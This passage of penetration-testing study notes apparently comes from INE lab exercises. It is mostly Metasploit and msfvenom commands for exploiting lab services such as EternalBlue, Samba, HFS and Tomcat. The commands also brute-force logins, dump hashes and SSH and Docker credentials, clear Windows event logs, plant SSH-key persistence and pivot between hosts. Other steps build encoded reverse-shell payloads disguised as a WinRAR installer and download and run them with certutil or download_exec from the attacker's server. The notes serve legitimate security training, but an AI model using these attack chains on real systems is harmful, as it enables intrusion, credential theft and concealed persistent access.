        set RHOSTS demo.ine.local
        set SMBUser Administrator
        set SMBPass qwertyuiop
        exploit
        #got meterpreter
        shell
        cd /
        dir
        type flag.tx
        
        ```
        
    - **Windows: Enabling Remote Desktop (RDP)**
        
        Metasploit provides a large collection of exploits for various software vulnerabilities. These exploits can be used to gain unauthorized access to systems. It also consists of modules that help in maintaining control over compromised systems, collecting sensitive data, and escalating privileges. In this lab, we will explore a couple of modules to exploit a vulnerable application and gain an RDP session on the target.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable application will be accessible at **demo.ine.local**.
        
        Your task is to fingerprint the vulnerable application using the tools available on the Kali machine and then exploit the vulnerability using the Metasploit framework. Then, enable the target machine RDP service and access it using xfreerdp tool.
        
        **Objective:** Your task is to find and exploit the vulnerable application and get the RDP session to find the flag!
        
        **Note:** rdesktop will not work on this setup as it does not support NLA. Please use xfreerdp to connect to the RDP server.
        
        Tools: nmap , msf, xfreerdp
        
        ```bash
        nmap demo.ine.local
        nmap -sV -p 80 demo.ine.local
        #Note: The RDP default port is not exposed - 3389.
        #We have discovered that multiple ports are open. We will run nmap again to determine version information on port 80.
        nmap -sV -p 80 demo.ine.local
        #We will search the exploit module for badblue 2.7 using searchsploit.
        searchsploit badblue 2.7
        
        msfconsole -q
        use exploit/windows/http/badblue_passthru
        set RHOSTS demo.ine.local
        exploit
        #We have successfully exploited the target vulnerable application (badblue) and received a meterpreter shell.
        Background the session.
        
        #Enabling the RDP service using windows post exploitation module.
        use post/windows/manage/enable_rdp
        set SESSION 1
        exploit
        
        #The post exploit worked fine. Re-running nmap to check if RDP port is exposed or not.
        nmap demo.ine.local
        #The RDP port 3389 is exposed.
        # Interact with the meterpreter shell and change the administrator password.
        sessions -i 1
        shell
        net user administrator hacker_123321
        #Use hydra to check
        
        #Connect to the RDP service using xfreerdp utility and administrator account.
        xfreerdp /u:administrator /p:hacker_123321 /v:demo.ine.local
        
        Y
        
        #Reading the flag.txt file which is present on the Desktop of the Administrator user.
        ```
        
    - **Clearing Windows Event Logs**
        
        Clearing tracks after exploiting a system is a crucial step for attackers who want to avoid detection and maintain access. Metasploit, a popular framework for developing and executing exploit code against a remote target machine, also includes techniques that can be used to cover tracks after an exploit.
        
        In this lab environment, you will be provided with GUI access to a Kali machine and a target Windows machine. The target machine running a vulnerable application will be accessible at **demo.ine.local**.
        
        **Objective:** Your task is to exploit the vulnerable application and then clear the Windows Event logs with Metasploit.
        
        **Tools: nmap, msf**
        
        ```bash
        
        nmap -sV demo.ine.local
        #Meterpreter provides you with the ability to clear the entire Windows Event log. This can be done by running the following command:e
        
        msfconsole
        use exploit/windows/http/badblue_passthru
        set RHOSTS demo.ine.local
        exploit
        
        clearev
        #Meterpreter provides you with the ability to clear the entire Windows Event log. This can be done by running the following command:
        
        ```
        
    - **Pivoting**
        
        This lab focuses on the concept of pivoting, a crucial technique in penetration testing that allows an attacker to move from one compromised system to another within the same network. By exploiting vulnerabilities on the initial target, you will gain access and then pivot to exploit and access a secondary target.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machines will be accessible at **demo1.ine.local** and **demo2.ine.local**.
        
        **Objective:** Exploit vulnerabilities in the target machines to gain access and retrieve a flag.
        
        Tools: nmap , searchsploit, msf
        
        ```bash
        
        ping -c 4 demo1.ine.local
        ping -c 4 demo2.ine.local
        nmap demo1.ine.local
        nmap -sV -p80 demo1.ine.local
        searchsploit hfs
        msfconsole -q
        use exploit/windows/http/rejetto_hfs_exec
        set RHOSTS demo1.ine.local
        exploit
        ipconfig
        #We can observe, there is only one network adapter and we have two machine IP addresses.
        #But, we cannot access “demo2.ine.local” directly from the attacker’s machine.
        #We will add a route and then we will run an auxiliary port scanner module on the second victim machine to discover a host and open ports.
        
        run autoroute -s 10.0.19.0/20
        
        background
        use auxiliary/scanner/portscan/tcp
        set RHOSTS demo2.ine.local
        set PORTS 1-100
        exploit
        sessions -i 1
        portfwd add -l 1234 -p 80 -r <IP Address of demo2.ine.local>
        portfwd list
        #We have discovered port 80 on the pivot machine. Now, we will forward the remote port 80 to local port 1234 and grab the banner using Nmap
        
        #The machine is running BadBlue HTTPd 2.7, a Windows-based web server. We will search the exploit module for badblue 2.7 using searchsploit.
        nmap -sV -sS -p 1234 localhost
        searchsploit badblue 2.7
        background
        use exploit/windows/http/badblue_passthru
        set PAYLOAD windows/meterpreter/bind_tcp
        set RHOSTS demo2.ine.local
        exploit
        shell
        cd /
        dir
        type flag.txt
        ```
        
    - **Post Exploitation Lab 1**
        
        This lab focuses on exploiting a vulnerable file-sharing service on a Linux server, using a variety of Metasploit post-exploitation modules to deeply explore and extract critical data from the system. Through a comprehensive engagement, participants will gain skills in identifying vulnerabilities, exploiting them to gain initial access, and leveraging post-exploitation techniques to gather system configurations, network details, environment variables, and more.
        
        In this lab, the target machine is running a vulnerable file-sharing service. Exploit it and run the following post modules on the target:
        
        - post/linux/gather/enum_configs
        - post/multi/gather/env
        - post/linux/gather/enum_network
        - post/linux/gather/enum_protections
        - post/linux/gather/enum_system
        - post/linux/gather/checkcontainer
        - post/linux/gather/checkvm
        - post/linux/gather/enum_users_history
        - post/multi/manage/system_session
        - post/linux/manage/download_exec
        
        The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** To exploit a vulnerable file-sharing service on a Linux server and utilize various Metasploit post-exploitation modules to gather critical system data, including configurations, network details, environment variables, and user history, while also assessing system protections and executing commands remotely.
        
        Tools: msf, bash, terminal, nmap
        
        ```bash
        nmap -sS -sV -p- demo.ine.local
        #139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
        #445/tcp open  netbios-ssn Samba smbd 4.1.17 (workgroup: WORKGROUP)
        
        msfconsole
        use exploit/linux/samba/**is_known_pipename**
        set RHOST demo.ine.local
        check
        exploit -z
        
        use post/linux/gather/enum_configs
        set SESSION 1
        run
        
        use post/multi/gather/env
        set SESSION 1
        run
        
        use post/linux/gather/enum_network
        set SESSION 1
        run
        
        use post/linux/gather/enum_protections
        set SESSION 1
        run
        
        use post/linux/gather/enum_system
        set SESSION 1
        run
        
        use post/linux/gather/checkcontainer
        set SESSION 1
        run
        
        use post/linux/gather/checkvm
        set SESSION 1
        run
        
        use post/linux/gather/enum_users_history
        set SESSION 1
        run
        
        use post/multi/manage/system_session
        set SESSION 1
        set TYPE python
        set HANDLER true
        set LHOST 192.216.221.2
        run
        #Now, let’s create a bash file which will create a user on the target machine by uploading a test.sh file and execute it.
        useradd hacker
        useradd test
        useradd nick
        #Now, let’s run the Apache server on the attacker’s machine and copy the test.sh file in the root folder.
        /etc/init.d/apache2 start
        cp test.sh /var/www/html
        
        use post/linux/manage/download_exec
        set URL http://192.216.221.2/test.sh
        set SESSION 1
        run
        
        #Let’s verify it by interacting with the session.
        sessions -i 1
        cat /etc/passwd
        ```
        
    - **Privilege Escalation - Rootkit Scanner**
        
        This lab focuses on exploiting a vulnerable rootkit scanner on a Linux server, guiding participants through steps such as identifying services, gaining initial access, and performing local privilege escalation. The exercise underscores the importance of understanding and mitigating known vulnerabilities in system utilities.
        
        In this lab, the target server is running a vulnerable Rootkit Scanner. Your task is to exploit a known issue using the appropriate Metasploit module and escalate it to the root user.
        
        **Objective:** Escalate to the root user on the target machine and retrieve the flag!
        
        **SSH Login Credentials:**
        
        | Username | Password | | jackie | password |
        
        **Tools: msf, bash, terminal, nmap**
        
        ```bash
        nmap -sS -sV demo.ine.local
        #port 22 ssh OpensSSH
        
        msfconsole
        use auxiliary/scanner/ssh/ssh_login
        set RHOSTS demo.ine.local
        set USERNAME jackie
        set PASSWORD password
        exploit
        
        sessions -i 1 
        meterpreter> ps aux
        #Observe, that there are a couple of processes running i.e. cron and one bash script.
        
        #Investigate the check-down bash script.
        cat /bin/check-down
        
        #The chkrootkit rootkit scanner is running as root every 60 seconds. Check the chkrootkit location and its version.
        command -v chkrootkit
        /bin/chkrootkit -V
        
        # We found the chkrootkit binary location and its version. Searching privilege escalation exploit module for chkrootkit 0.49.
        searchsploit chkrootkit 0.49
        
        #The current version of chkrootkit is vulnerable to local privilege escalation. We will use the Metasploit module to gain root access and read the flag file which is located under the /root directory.
        
        use exploit/unix/local/chkrootkit
        set CHKROOTKIT /bin/chkrootkit
        set session 1
        set LHOST 192.60.22.2
        exploit
        cat /root/flag
        
        ```
        
    - **Post Exploitation Lab 2**
        
        This lab focuses on exploiting a vulnerable file sharing service on a target machine and utilizing a suite of Metasploit post-exploitation modules. Participants will navigate through initial system compromise, credential harvesting, and establishing persistent access, providing a thorough understanding of advanced penetration techniques and long-term system control.
        
        In this lab, the target machine is running a vulnerable file-sharing service. Exploit it and run the following post modules on the target:
        
        - post/multi/gather/ssh_creds
        - post/multi/gather/docker_creds
        - post/linux/gather/hashdump
        - post/linux/gather/ecryptfs_creds
        - post/linux/gather/enum_psk
        - post/linux/gather/enum_xchat
        - post/linux/gather/phpmyadmin_credsteal
        - post/linux/gather/pptpd_chap_secrets
        - post/linux/manage/sshkey_persistence
        
        The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** To exploit a vulnerable file-sharing service and utilize Metasploit post-exploitation modules to achieve system compromise, credential harvesting, and persistent access.
        
        Tools: msf, bash, termnal, nmap
        
        ```bash
        
        nmap -Pn -A -T4 demo.ine.local
        #139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
        #445/tcp open  netbios-ssn Samba smbd 4.1.17 (workgroup: WORKGROUP)
        msfconsole
        search samba/is_
        
        msfconsole
        use exploit/linux/samba/is_known_pipename
        set RHOST demo.ine.local
        check
        exploit -z
        
        use post/multi/gather/ssh_creds
        set SESSION 1
        run
        
        use post/multi/gather/docker_creds
        set SESSION 1
        run
        
        use post/linux/gather/hashdump
        set SESSION 1
        set VERBOSE true
        run
        
        use post/linux/gather/ecryptfs_creds
        set SESSION 1
        run
        
        use post/linux/gather/enum_psk
        set SESSION 1
        run
        
        use post/linux/gather/enum_xchat
        set SESSION 1
        set XCHAT true
        run
        use post/linux/gather/phpmyadmin_credsteal
        set SESSION 1
        run
        
        use post/linux/gather/pptpd_chap_secrets
        set SESSION 1
        run
        
        use post/linux/manage/sshkey_persistence
        set SESSION 1
        run
        
        ```
        
    - **Establishing Persistence On Linux**
        
        This lab delves into the techniques for establishing persistent access on a Linux system. Participants are tasked with exploiting a vulnerable Linux server target. Through a series of steps, including initial access, privilege escalation, and establishing persistence, this lab provides comprehensive training on maintaining long-term access to a compromised system.
        
        In this lab, the target server is running a vulnerable Rootkit Scanner. This lab covers the process of establishing persistence on Linux with Metasploit. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** Escalate to the root user on the target machine and retrieve the flag!
        
        **SSH Login Credentials:**
        
        | Username | Password | | jackie | password |
        
        Tools: msf, bash, terminal , nmap
        
        ```bash
        nmap -sS -sV demo.ine.local
        # port 22 openssh
        
        msfconsole
        use auxiliary/scanner/ssh/ssh_login
        set RHOSTS demo.ine.local
        set USERNAME jackie
        set PASSWORD password
        exploit
        #got meterpreter session
        sessions -u 1
        
        #we will first need to elevate our privileges on the Linux target.
        #The target system has a vulnerable version of chkrootkit installed that is vulnerable to privilege escalation and can be exploited through the use of a Metasploit module.
        use exploit/unix/local/chkrootkit
        set SESSION 2
        # In your case, the SESSION ID will be different.
        #We will also need to set the path to the chkrootkit binary, this can be done by running the following command:
        set CHKROOTKIT /bin/chkrootkit
        set LHOST 192.84.46.2
        exploit
        
        #the module runs successfully and provides us with an elevated command shell session on the target system.
        #We can also upgrade this command shell session to a meterpreter session by running the following command:
        
        sessions -u 3
        #Now that we have been able to elevate our privileges on the target system, we can begin exploring the process of establishing persistence.
        
        #The best Metasploit module that can be used to establish persistent access on a Linux target is the sshkey_persistence module.
        use post/linux/manage/sshkey_persistence
        set SESSION 4
        set CREATESSHFOLDER true
        exploit
        #the module runs successfully and will add a public SSH key to the authorized_keys file in the home directory of all user and service accounts.
        
        #ssh private key
        /root/.msf4/loot/20240716164352_default_192.217.38.3_id_rsa_606834.txt
        
        #To use the private key, copy the key and save it as a new file, in this case, we will be saving it in the home directory of the root user on the Kali Linux system as ssh_key.
        cp /root/.msf4/loot/20240716164352_default_192.217.38.3_id_rsa_606834.txt ssh_key
        
        #We will then need to assign the appropriate permissions to the file, this can be done by running the following commands:
        chmod 0400 ssh_key
        ssh -i ssh_key root@demo.ine.local
        #We can now authenticate with the target using the private key via SSH by running the following command:
        
        ```
        
        the authentication with the private key is successful and we have successfully been able to establish persistent access to the Linux target by adding our public key to the authorized_keys file of over user account, consequently allowing us to authenticate with the target via SSH without providing a password.
        
        In this lab, we explored the process of establishing persistent access on a Linux target with Metasploit.
        
    - **Port Scanning and Enumeration with Armitage**
        
        Armitage is a graphical cyber attack management tool for Metasploit, which is one of the most widely used frameworks for penetration testing. Armitage simplifies the use of Metasploit by providing a user-friendly interface, making it easier for users to manage exploits, payloads, and sessions during penetration tests. This lab covers the process of performing port scanning & enumeration with Armitage.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo1.ine.local**.
        
        **Objective:** Enumerate the target machine and perform port scanning using Armitage.
        
        Tools:
        
        - Armitage
        - Metasploit Framework
        
        ```bash
        service postgresql start
        service postgresql status
        armitage
        
        ```
        
    - **Exploiting and Post Exploitation with Armitage**
    
    - **Enumeration**
        - FTP
            
            File Transfer Protocol -21
            
            >**nmap —script=fpt-* -p 21 ip**    //comprehensive scan on FTP
            
            `nmap -sV 10.10.10.10`
            
            `service postgresql start && msfconsole`
            
            `workspace -a FTP_ENUM` 
            
            `workspace`
            
            1. `use auxiliary/scanner/portscan/tcp`
            2. `search type:auxiliary name: ftp`
            3. `use auxiliary/scanner/ftp/ftp_login`
                
                `set RHOSTS 10.10.10.10`
                
                `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
                
                `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
                
                `run`
                
            4. `use auxiliary/scanner/ftp/ftp_version`
            5. `use auxiliary/scanner/ftp/anonymous`
            6. run
            7. ftp ip
            
            //or another login system:
            
            1. ~#ftp target_ip
            2. name: sysadmin
            3. password:
            4. ftp>ls
            5. get secret.txt
            6. exit
            7. ls
            8. cat secret.txt
            
        - SMB
            
            Server Message Block - 139(NetBIOS),445(TCP)
            
            SAMBA is the linux implementation of SMB
            
            ifconfig eth1 .2—>3 target ip
            
            `service postgresql start && msfconsole`
            
            `workspace -a SMP_ENUM`
            
            1. `setg RHOSTS 10.10.10.10`
            2. search type:auxiliary name:smb
            3. `use auxiliary/scanner/portscan/tcp`
            4. `use auxiliary/scanner/smb/smb_version`
            5. `use auxiliary/scanner/smb/smb_enumusers`
            6. info
            7. run
            8. `use auxiliary/scanner/smb/smb_enumshares`
            9. set showfiles true
            10. run
            11. `use auxiliary/scanner/smb/smb_login`
                
                `set SMBUser admin`
                
                `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
                
                `run`
                
                exit
                
                #
                
            12. `smbclient -L \\\\10.10.10.10\\ -U admin` 
            13. `smbclient \\\\10.10.10.10\\public -U admin`
            14. ls
            15. cd secret
            16. get flag
            17. exit
            18. cat flag
            
        - Web Server (Apache)
            
            Popular web servers: Apache, Nginx and Mircrosoft IIS
            
            Apache - port 80,443
            
            ifconfig 2 —>3 for eth1
            
            1. `service postgresql start && msfconsole`
            2. `workspace -a Web_Enum`
            3. `setg RHOSTS 10.10.10.10`
            4. `setg RHOST 10.10.10.10` 
            5. search type:auxiliary name:http
            6. `use auxiliary/scanner/http/http_version`
            7. search http_header
            8. `use auxiliary/scanner/http/http_header`
            9. run
            10. search robots_txt
            11. `use auxiliary/scanner/http/robots_txt`
            12. user-agent: disallow: /data and /secure
            13. curl http://ip/secure/
            14. `use auxiliary/scanner/http/dir_scanner`
            15. run
            16. analysis diff dir
            17. `use auxiliary/scanner/http/files_dir`
            18. `use auxiliary/scanner/http/apache_userdir_enum`
                
                `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
                
            19. `use auxiliary/scanner/http/http_login`
                
                `set AUTH_URI /secure`
                
                `unset USERPASS_FILE`
                
                `set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt`
                
                `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
                
                `set VERBOSE false`
                
                `run`
                
                set USER_FILE and set PASS_FILE change msf pass
                
                search apache_userdir_enum
                
                run
                
                echo “rooty” > user.txt
                
        - MySQL
            
            MySQL - 3306
            
            1. `service postgresql start && msfconsole`
            2. `workspace -a SQL_ENUM`
            3. `setg RHOSTS 10.10.10.10`
            4. `use auxiliary/scanner/mysql/mysql_version`
            5. `use auxiliary/scanner/mysql/mysql_login`
                
                `set USERNAME root`
                
                `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
                
                `set VERBOSE false`
                
                `run root:twinkle`
                
            6. `use auxiliary/admin/mysql/mysql_enum`
                
                `set USERNAME root`
                
                `set PASSWORD twinkle`
                
                `run`
                
            7. `use auxiliary/admin/mysql/mysql_sql`
                
                `set USERNAME root`
                
                `set PASSWORD twinkle`
                
                `set SQL show databases;`
                
                `run`
                
                set SQL use videos;
                
                run
                
            8. `use auxiliary/scanner/mysql/mysql_schema`
                
                `set username and password` 
                
                run
                
                hosts
                
                services
                
                loot
                
                creds
                
                exit
                
                //#
                
            9. `mysql -h 10.10.10.10 -u root -p twinkle`
            10. MySQL>show databases;
            11. use vides;
            12. show tables;
            13. exit
            
        - SSH
            
            Secure Shell - 22
            
            1. `service postgresql start && msfconsole` 
            2. `workspace -a ssh_enum`
            3. `setg rhosts 10.10.10.10`
            4. `use auxiliary/scanner/ssh/ssh_version`
            5. `use auxiliary/scanner/ssh/ssh_login`
                
                `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
                
                `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt`
                
                run
                
                sessions
                
                sessions 1
                
                ..>ls
                
                /bin/bash -i
                
                whoami
                
                exit
                
                `run sysadmin:hailey`
                
            6. `use auxiliary/scanner/ssh/ssh_enumusers`
                
                `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
                
            
        - SMTP
            
            Simple Mail Transfer Protocol - 25,465, 587
            
            ifconfig
            
            1. `service postgresql start && msfconsole`
            2. `workspace -a smtp_enum`
            3. `setg rhosts 10.10.10.10`
            4. search type:auxiliary name: smtp
            5. `use auxiliary/scanner/smtp/smtp_version`
            6. `use auxiliary/scanner/smtp/smtp_enum`
            7. info         //more knowledge about this
            8. run
            
    - **Vulnerability Scanning**
        - Vulnerability scanning with msf
            
            ```bash
            $ifconfig
            sudo nmap -sn 10.10.10.1/24
            msfconsole
            deb status
            setg rhosts ip
            workspace -a MS3
            db_nmap -sS -sV -O target_ip
            hosts
            services
            seach type:exploit name: Microsoft IIs
            seach type:exploit name: MySQL 5.5
            serach sun glassfish
            use exploit/multi/http/glassfish_deployer
            set payload windows/meterpreter/reverse_tcp
            show options
            services
            back
            msf6>services
            $searchsploit "Microsoft windows smb"
            $searchsploit "Microsoft windows smb" | grep -e "Metasploit"
            
            msf:
            seach eternalblue
            use 3     (scanner/smb/smb_ms17_-1-
            run
            use exploit/windows/smb/ms17_010-eternalblue
            show options
            run
            meterpreter>sysinfo
            exit
            
            >>>measploit-autopwn
            $cd Downloads
            #wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
            
            #> sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins 
            
            msf:
            load db_autopwn
            db_autopwn
            db_autopwn -p -t
            db_autopwn -p -t -PI 445
            analyze
            vulns
            services
            
            ```
            
        - with Nessus
        - Web App vulnerability scanning with WMAP
            
            ```bash
            
            ```
            
    - **Client-side Attacks**
        - Generating Payloads with msfvenom
            
            ```bash
            $msfvenom
            msfvenom --list payloads
            //staged and non staged payload
            msfvenom -a x86 -p windows/meterperter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/kali/Desktop/Windows_Payloads/payloadx86.exe
            msfvenom -a x64 -p windows/meterperter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/kali/Desktop/Windows_Payloads/payloadx64.exe
            cd Desktop/Windows_Payloads/
            ls
            //output formate
            msfvenom --list formats
            //linux payload create
            cd ..
            cd Desktop
            msfvenom -a x86 -p linux/meterperter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f elf > ~/Desktop/Linux_Payloads/payloadx86
            cd Linux_Payloads
            ls
            chmod +x payloadx86
            msfvenom -a x64 -p linux/meterperter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f elf > ~/Desktop/Linux_Payloads/payloadx64
            ls
            cd ..
            ls
            cd Windows_Payloads/
            ls
            sudo python -m SimpleHTTPServer 80
            
            //new tab
            msfconsole
            use multi/handler
            set payload windows/meterperter/reverse_tcp
            set LHOST 10.10.10.5
            set LPORT 1234
            run
            
            //windows browser
            ip          //in the search bar up
            
            /set  paylodad linux/meterperter/reverse_tcp
            run
            
            ```
            
        - Encoding Payloads with msfvenom
            
            ```bash
            cd Desktop
            msfvenom --list encoders
            msfvenom -p windows/meterperter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodedx86.exe
            ls
            cd Windows_Payloads/
            ls
            rm encodedx86
            msfvenom -p windows/meterperter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai **-i 10** -f exe > ~/Desktop/Windows_Payloads/encodedx86.exe
            ls
            msfvenom -p linux/meterperter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai **-i 10** -f elf > ~/Desktop/Linux_Payloads/encodedx86
            ls
            cd ..
            cd Linux_Payloads
            ls
            sudo python -m SimpleHTTPServer 80
            
            ..new tap 
            msfconsole
            use multi/handler
            set payload windows/meterperter/reverse_tcp
            set LHOST 10.10.10.5
            set LPORT 1234
            run
            //windows browser system
            meterpreter>sysinfo
            
            ```
            
        - Injecting Payloads into windows portable executables
            
            ```bash
            $msfvenom
            
            //firefox > winRAR >download >windRAR 6.02 Englinsh 32 bit
            msfvenom -p windows/meterperter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 **-i 10** -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/winrar.exe
            ls
            cd Desktop/Windows_Payloads/
            ls
            sudo python -m SimpleHTTPServer 80
            
            //another tab
            msfconsole
            use multi/handler
            set payload windows/meterperter/reverse_tcp
            set LHOST 10.10.10.5
            set LPORT 1234
            run
            
            //windows web server and download from http://ip and file: payloadx64.exe
            //winrar file and give the pass
            
            meterpreter>sysinfo
            run post/windows/manage/migrate
            sysinfo
            ls
            
            $/Desktop/Windows_Payload$ msfvenom -p windows/meterperter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -k -x > ~/Desktop/Windows_Payloads/winrar.exe
            ls 
            
            ```
            
        - Automating metasploit with resource scripts
            
            ```bash
            ls -al /usr/share/metarplolit-framework/scriopts/resource/
            
            msfconsole
            use multi/handler
            set payload windows/meterperter/reverse_tcp
            set LHOST 10.10.10.5
            set LPORT 1234
            run
            
            exit
            /Desktop/Windows_Payloads$ ls
            vim handler.rc
            use multi/handler
            set payload windows/meterperter/reverse_tcp
            set LHOST 10.10.10.5
            set LPORT 1234
            run
            //go to vim and set the payload and :wq
            msfconsole -r hander.rc
            exit
            
            vim posrtscan.rc
            use auxiliary/scanner/portscan/tcp
            set RHOSTS 10.10.10.5
            run
            //enter and :wq
            exit
            msfconsole -r portscan.rc
            //automatically run this
            //anothe example
            
            vim db_status
            db_status
            workspace
            workspace -a Test
            //enter and :wq
            msfconfconsole -r db_status.rc
            exit
            
            msfconsole
            resource ~/Desktop/Windows_Payload/handler.rc
            exit
            
            msfconsole
            use auxiliary/scanner/portscan/tcp
            set rhosts ip
            run
            makerc ~Desktop/portscan.rc
            cd ..
            sudo su
            cd /root/DEsktop/
            ls
            cat portscan.rc
            ```
            
    - **Exploitation**
        
        Windows Exploitation
        
        - Exploiting A vulnerability HTTP File server
            
            ```bash
            service postgresql start
            msfconsole
            db_status
            workspace -a HFS
            workspace
            setg RHOSTS 10.2.24.160
            db_nmap -sS -sV -O 10.2.24.160
            search type:exploit name:regetto
            use exploit/windows/http/rejetto_hfs_exec
            show options
            run
            meterpreter>sysinfo
            exit
            set payload windows/x64/meterpreter/reverse_tcp
            show options
            run
            meterpreter>sysinfo
            
            ```
            
        - Exploiting windows MS17-010 SMB Vulnerability
            
            ```bash
            service postgresql start
            msfconsole
            workspace -a EternalBlue
            workspace
            db_nmap -sS -sV -O 10.10.10.7
            services
            search type:auxiliary name:EternalBlue
            use auxiliary/scanner/smb/smb_ms17_010
            show options
            set RHOSTS 10.10.107
            run
            search type:exploit EternalBlue
            use exploit/windows/smb/ms17_010_eternalblue
            show options
            set rhosts ip
            run
            meterpreter>sysinfo
            getuid
            
            ```
            
        - Exploiting WinRM(windows remote management protocol)
            
            ```bash
            service postgresql start
            msfconsole
            workspace -a winRM
            workspace
            db_nmap -sS -sV -O 10.4.22.219
            services
            db_nmap -sS -sV -O -p- ip
            services
            search type:auxiliary winrm
            use auxiliary/scanner/winrm/winrm_auth_methods
            show options
            setg RHOSTS ip
            show options
            run
            
            search winrm_login
            use auxiliary/scanner/winrm/winrm_login
            show options
            set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
            set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
            run
            
            search winrm_cmd
            use 0
            show options
            set USERNAME administrator
            set PASSWORD tinkerbell
            set CMD whoami
            run
            
            search winrn_script
            use 0
            set USERNAME administrator
            set PASSWORD tinkerbell
            run
            show options
            
            set FORE_VBS true
            run
            meterpreter>sysinfo
            getuid
            ```
            
        - Exploiting A vulnerable **Apache Tomcat Web** Server
            
            ```bash
            
            service postgresql start
            msfconsole
            workspace -a tomcat
            workspace
            setg RHOSTS 10.2.20.126
            db_nmap -sS -sV -O 10.2.20.126
            services
            search type:exploit tomcat_jsp
            use 0
            show options
            info
            set payload java/sp_shell_bind_tcp
            show options
            set SHELL cmd
            run
            run
            /got command shell
            >dir
            getuid
            whoami
            
            exit
            sessions
            //new tab
            pwd 
            ifocnfig     eth1 inet ip
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.2.20.126 LPORT=1234 -f exe > meterpreter.exe
            ls
            sudo python -m SimpleHTTPServer 80
            
            //other tab
            sessions 1
            Tomcat>certutil -urlcache -f http://10.2.20.126/meterprter.exe meterpreter.exe
            
            #vim handler.ce
            use muti/handler
            set PAYLOAD windows/meterpreter/reverse_tcp
            set LHOST 10.10.5.4
            run
            
            //:wq
            msfconsole -r handler.rc
            
            Tomcat>.\meterpreter.exe
            
            meterpreter>sysinfo
            getuid
            
            ```
            
        
        Linux Exploitation
        
        - Exploiting A vulnerable FTP Server
            
            ```bash
            
            service postgresql start && msfconsole
            workspace -a vsftpd2.3.4
            workspace
            setg RHOSTS 192.209.183.3
            db_nmap -sS -sV -O 192.209.183.3
            services
            vuls
            search vsftpd
            use 1
            show options
            info
            run
            ///
            ls
            /bin/bash -i
            
            exit
            sessions
            search shell_to_meterpreter
            use 1
            show options
            set LHOST eth1
            set SESSION 1
            run
            sessions 
            sessions 2
            meterpreter>sysinfo
            
            ```
            
        - Exploiting Samba
            
            ```bash
            ifconfig
            service postgresql start && msfconsole
            workspace -a samba
            workspace
            setg RHOSTS 192.18.76.3
            db_nmap -sS -sV -O 192.18.76.3
            services
            vuls
            search type:exploit name:samba
            use exploit/linux/samba/is_known_pipename
            show options
            check
            info
            run
            //command line session
            ls
            pwd
            /tmp
            exit
            sessions
            search shell_to_meterpreter
            use 1
            show options
            set LOHOSTs eth1
            set SESSION !
            run sessions
            sessions 2
            sysinfo
            getuid
            
            ```
            
        - Exploiting A vulnerable SSH Server
            
            ```bash
            ifconfig
            service postgresql start && msfconsole
            workspace -a libssh
            workspace
            setg RHOSTS 192.40.32.3
            db_nmap -sS -sV -O 192.40.32.3
            services
            vuls
            search libssh_auth_bypass
            use auxiliary/scanner/ssh/libssh_auth_bypass
            show options
            set SPAWN_PTY true
            run
            sessions
            sessions 1
            //access#whoami
            cat /etc/*release
            uname -r
            
            exit
            search shell_to_meterpreter
            use 1
            use show options
            set LHOST eth1
            set SESSION 1
            run
            sessions
            sessions 2
            meterpreter>sysinfo
            
            ```
            
        - Exploiting A Vulnerable SMTP Server
            
            ```bash
            ifconfig
            service postgresql start && msfconsole
            workspace -a haraka
            workspace
            setg RHOSTS 192.86.51.3
            db_nmap -sS -sV -O 192.86.51.3
            services
            vuls
            search type:exploit name:haraka
            use exploit/linux/smtp/haraka
            show options
            set SRVPORT 9898
            set email_to root@attackdefense.test
            set payload linux/x64/meterpreter_reverse_http
            show options
            set LHOsT eth1
            run
            meterpreter>sysinfo
            getuid
            //uid=0 means you have root accsess
            
            ```
            
    - **Post Exploitation**
        - Meterpreter Fundamentals
            
            ```bash
            sysinfo
            getuid
            help
            background
            sessions
            sessions -h
            sessions -C sysinfo -i 1
            sessions 1
            background
            sessions -l
            sessions -n xoda -i 1
            sessions 
            sessions 1
            ls
            pwd
            cd ..
            ls
            cat flag1
            edit flag1       /exit by :qe
            cd "Secret Files"
            ls
            cat .flag2
            ls
            cd ..
            download flag5.zip
            background
            ls
            unzip flag5.zip
            ls
            cat list
            sessions 1
            checksum md5 /bin/bash
            getenv PATH
            getenv TERM           /get environment
            
            search -d /usr/bin -f *backdoor*
            search -f *.php
            seach -f *.jpg
            ls
            download flag1
            exit
            ls
